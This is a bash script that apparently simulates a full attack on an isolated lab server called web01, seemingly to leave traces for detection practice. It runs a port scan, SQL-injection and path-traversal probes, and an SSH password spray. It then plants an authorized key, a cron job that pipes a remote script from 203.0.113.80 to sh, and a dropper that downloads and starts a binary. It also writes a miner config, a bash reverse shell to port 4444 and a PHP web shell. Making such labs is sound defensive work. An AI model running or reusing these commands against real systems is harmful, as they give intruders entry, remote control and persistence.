#!/bin/bash
# The attack of omamori lab. It runs in the attacker container and reaches only the lab server (web01) on a
# Docker network that has no way out. 203.0.113.80 is an address for documentation: nothing answers there.
# Nothing that is left on the server is started, except a copy of sleep that cannot run from /dev/shm.
T=web01
SSH="ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o PreferredAuthentications=password -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 -o ConnectTimeout=5"

echo "stage scan: ports 1 to 200"
for p in $(seq 1 200); do timeout 1 bash -c "</dev/tcp/$T/$p" 2>/dev/null; done

echo "stage web: scan for files, injection probes, a scanner tool"
for p in / /index.html /.env /.git/config /wp-login.php /admin /phpmyadmin/ /backup.zip /config.php /server-status /.aws/credentials /id_rsa /db.sql; do
  curl -s -o /dev/null -A "Mozilla/5.0 (compatible; Nikto/2.5.0)" "http://$T$p"; done
for i in $(seq 1 30); do curl -s -o /dev/null "http://$T/page$i.php"; done
curl -s -o /dev/null "http://$T/item?id=1%27%20OR%201=1--"
curl -s -o /dev/null "http://$T/download?file=../../../../etc/passwd"
curl -s -o /dev/null "http://$T/search?q=1%20UNION%20SELECT%20username,password%20FROM%20users"
curl -s -o /dev/null -A "sqlmap/1.8.2#stable (https://sqlmap.org)" "http://$T/item?id=1"

echo "stage spray: one password for many accounts"
for u in root admin test oracle ubuntu postgres guest support deploy alice; do
  sshpass -p 'Welcome1' $SSH $u@$T true 2>/dev/null; done

echo "stage guess: passwords of alice, then the right one"
for pw in password 123456 qwerty alice2026 Spring2026 Summer2025 'Summer2026'; do
  sshpass -p "$pw" $SSH alice@$T true 2>/dev/null; done

echo "stage persist: a key, a cron job and a history as alice"
# A real key pair, made here in the attacker container. Only its public half goes to web01.
rm -f /tmp/k /tmp/k.pub && ssh-keygen -q -t ed25519 -N '' -C attacker@lab -f /tmp/k
sshpass -p 'Summer2026!' $SSH alice@$T 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys' < /tmp/k.pub
sshpass -p 'Summer2026!' $SSH alice@$T 'bash -s' <<'IN'
echo "x" | sudo -S -k id >/dev/null 2>&1
( crontab -l 2>/dev/null; echo '* * * * * curl -fsSL http://203.0.113.80/u.sh | sh' ) | crontab -
echo 'curl -fsSL http://203.0.113.80/u.sh | sh' >> ~/.bash_history
echo 'cat /etc/passwd' >> ~/.bash_history
IN

echo "stage tools: a dropper, a program, a miner config, a reverse shell and a web shell"
sshpass -p 'Summer2026!' $SSH alice@$T 'bash -s' <<'IN'
cat > /tmp/.u.sh <<'DROP'
#!/bin/sh
mkdir -p /dev/shm/.x /var/tmp/.dbus
curl -fsSL -m 5 http://203.0.113.80/k -o /dev/shm/.x/kworker
chmod +x /dev/shm/.x/kworker
nohup /dev/shm/.x/kworker -B >/dev/null 2>&1 &
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOmamoriLabFakeAttackerKeyNotRealAAAAAAAAAAAA attacker@lab' >> ~/.ssh/authorized_keys
unset HISTFILE
DROP
mkdir -p /dev/shm/.x /var/tmp/.dbus
cp /bin/sleep /dev/shm/.x/kworker
printf '{"autosave": true, "cpu": true, "pools": [{"url": "stratum+tcp://pool.example.test:3333", "user": "lab"}]}\n' > /dev/shm/.x/config.json
printf '#!/bin/sh\nwhile true; do bash -i >& /dev/tcp/203.0.113.80/4444 0>&1; sleep 60; done\n' > /var/tmp/.dbus/helper
chmod +x /var/tmp/.dbus/helper
printf "<?php system(\$_GET['c']); ?>\n" > /var/www/html/uploads/x.php
IN
curl -s -o /dev/null "http://$T/uploads/x.php?c=id"
echo "stage done"
